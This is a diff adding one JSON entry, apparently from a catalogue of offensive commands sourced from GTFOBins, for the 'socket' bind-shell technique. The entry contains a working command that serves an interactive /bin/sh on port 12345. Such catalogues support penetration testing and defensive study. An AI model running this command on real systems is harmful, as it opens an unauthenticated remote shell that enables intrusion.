@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-socket-bind-shell",
+  "name": "GTFOBins · socket (bind-shell)",
+  "command": "socket -svp '/bin/sh -i' 12345",
+  "description": "Use socket to bind shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "socket",
+    "bind-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/socket/#bind-shell",
+  "upstream_id": "socket/bind-shell/0",
+  "category": "gtfobins",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/socket/"
+    }
+  ]
+}
